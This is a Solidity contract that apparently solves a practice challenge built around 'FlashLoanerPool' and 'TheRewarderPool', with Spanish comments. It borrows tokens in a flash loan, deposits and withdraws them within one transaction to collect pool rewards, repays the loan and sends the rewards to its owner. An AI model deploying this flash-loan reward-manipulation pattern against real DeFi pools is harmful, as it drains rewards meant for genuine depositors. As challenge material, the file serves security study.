// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract Exploit {
    FlashLoanerPool private lendingPool;
    TheRewarderPool private _theRewarderPool;
    IERC20 dvtToken;
    IERC20 rewardToken;
    address owner;

    constructor(address _lp, address _trp, address _dvt, address _owner, address _rt){
        lendingPool = FlashLoanerPool(_lp);
        _theRewarderPool = TheRewarderPool(_trp);
        dvtToken = IERC20(_dvt);
        owner = _owner;
        rewardToken = IERC20(_rt);
    }

    function attack(uint256 amount) external{
        lendingPool.flashLoan(amount);
    }

    /* Llamamos a la funcion receiveFlashLoan para decirle que vamos a hacer con el dinero pedido, hacemos toda la logica incluyendo la devolucion de los fondos. */
    function receiveFlashLoan(uint256 amount) public  {
        // aprobamos el token dvt al rewarder pool
        dvtToken.approve(address(_theRewarderPool), amount);

        // depositamos tokens al the rewarder pool
        _theRewarderPool.deposit(amount);

        // retiramos tokens del rewarder pool
        _theRewarderPool.withdraw(amount);

        // Le devolvemos los tokens del flashloan al lendingPool
        dvtToken.transfer(address(lendingPool), amount);

        
        // Por ultimo enviamos todos los fondos de este contrato a la creador del contrato.
        uint256 rewardTokenBalance = rewardToken.balanceOf(address(this));

        rewardToken.transfer(owner, rewardTokenBalance);
    }

    receive() external payable {}
}